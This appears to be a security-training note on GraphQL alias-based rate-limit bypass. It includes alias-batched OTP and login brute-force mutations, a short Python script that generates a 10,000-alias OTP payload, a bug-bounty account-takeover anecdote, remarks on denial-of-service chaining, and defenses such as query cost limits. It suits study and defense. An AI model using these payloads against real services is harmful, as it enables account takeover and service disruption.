---
tags: [vapt, graphql, rate-limiting, brute-force, aliases]
difficulty: intermediate
module: "30 - GraphQL Security"
topic: "30.07 GraphQL Alias-Based Rate Limit Bypass"
---

# 30.07 — GraphQL Alias-Based Rate Limit Bypass

## What is it?
In [[06 - GraphQL Batching Attacks (brute force via batching)]], we discussed how attackers use JSON arrays to send thousands of queries in a single HTTP request, bypassing network-level rate limits. 

When developers discover array-based batching attacks, their first instinct is usually to configure the GraphQL server to reject JSON arrays, forcing the client to send a standard JSON object. They believe this secures the application. They are wrong.

GraphQL has a built-in feature called **Aliases**. Aliases allow a client to request the *same field or mutation multiple times in a single query* by giving each execution a unique name (the alias). This completely circumvents anti-batching protections, allowing an attacker to execute thousands of operations within a single, standard, non-array GraphQL object.

## The Alias Payload

Normally, GraphQL specifications state that you cannot request the same field multiple times at the same level if they require different arguments, because the resulting JSON keys would conflict. 

**Invalid Request (Will Error):**
```graphql
query {
  user(id: 1) { name }
  user(id: 2) { name } # ERROR: Key "user" already exists in response.
}
```

**Valid Request using Aliases:**
You prefix the field name with an arbitrary string and a colon.
```graphql
query {
  test_1: user(id: 1) { name }
  test_2: user(id: 2) { name }
  test_3: user(id: 3) { name }
}
```
The server processes all three requests concurrently and returns:
```json
{
  "data": {
    "test_1": { "name": "Alice" },
    "test_2": { "name": "Bob" },
    "test_3": { "name": "Charlie" }
  }
}
```

## How to Exploit It

### Brute Forcing OTPs or Passwords
Just like array batching, aliases can be used for catastrophic brute force attacks. If the target application disabled JSON arrays but relies on WAF-level rate limiting (e.g., "5 HTTP requests per minute"), you construct a single query with 5,000 aliases.

**Attacker Request (Single HTTP Request):**
```graphql
mutation {
  attempt1: verifyOTP(code: "0000") { token }
  attempt2: verifyOTP(code: "0001") { token }
  attempt3: verifyOTP(code: "0002") { token }
  ...
  attempt9999: verifyOTP(code: "9999") { token }
}
```

The execution engine will iterate through the query tree and invoke the `verifyOTP` resolver 10,000 times. Because it is a single HTTP request, the WAF allows it. Because it is a single query string (not an array), basic anti-batching protections allow it.

### Tooling for Alias Generation
Crafting a query with 10,000 aliases manually is impossible. Attackers use scripts to dynamically generate the payload.

**Example Python Payload Generator:**
```python
payload = "mutation {\n"
for i in range(0, 10000):
    code = str(i).zfill(4)
    payload += f'  otp_{code}: verifyOTP(code: "{code}") {{ token }}\n'
payload += "}"

print(payload)
```
You then paste the massive generated string into Burp Suite or pass it directly to `requests.post`.

## Visualizing the Difference

```text
========================================================================================
                          ARRAY BATCHING vs ALIAS BATCHING
========================================================================================

 [ ARRAY BATCHING (Blocked if Server disables Array Input) ]
 
  POST /graphql
  [
    { "query": "mutation { login(p: 'a') }" },
    { "query": "mutation { login(p: 'b') }" }
  ]
  --> Server checks if input is Array. If true -> 400 Bad Request. (FAILED)

----------------------------------------------------------------------------------------

 [ ALIAS BATCHING (Bypasses Array checks, still executes multiple times) ]

  POST /graphql
  {
    "query": "mutation { 
                A1: login(p: 'a') 
                A2: login(p: 'b') 
              }"
  }
  --> Server checks if input is Array. False (It's a valid string).
  --> Engine parses query. Sees two distinct fields (A1, A2).
  --> Invokes login() resolver twice. (SUCCESS)

========================================================================================
```

## Real-World Example
A bug bounty program explicitly stated that their login endpoint was out-of-scope for brute-forcing because they had deployed a strict AWS WAF rule that blocked any IP making more than 10 requests per minute. They also explicitly disabled array batching in their GraphQL server.

A researcher submitted a critical report demonstrating a bypass. They crafted a single GraphQL mutation string containing 2,000 aliases, each attempting to log in to an executive's account with a password from a common wordlist. The server CPU spiked to 100% for 3 seconds as it hashed 2,000 passwords simultaneously. The researcher received the valid authentication token for the executive account. The single request completely sidestepped the WAF and the array-batching protection.

## How to Fix It
- **Implement Query Cost Analysis / Complexity Limits:** The only robust defense against Alias attacks is to calculate the "cost" of a query before executing it. If a standard login query costs 10 points, and the server enforces a maximum query cost of 100 points per request, an attacker attempting to alias 2,000 logins (costing 20,000 points) will be rejected immediately by the GraphQL engine during the validation phase, before any resolvers are executed.
- **Resolver-Level Rate Limiting:** Similar to the defense for Array Batching, developers must implement rate limiting within the resolver code itself, utilizing Redis or Memcached to track attempts per username or IP, independent of the HTTP request layer.

## Chaining Opportunities
- This vuln + [[11 - GraphQL Depth and Complexity DoS]] → Aliases aren't just for brute-forcing; they force the server to execute expensive operations concurrently. If a complex search query takes 1 second to run, aliasing it 50 times in a single request will lock up the server thread for 50 seconds, causing an immediate Application-Layer Denial of Service.

## Related Notes
- [[06 - GraphQL Batching Attacks (brute force via batching)]]
- [[01 - What is GraphQL?]]
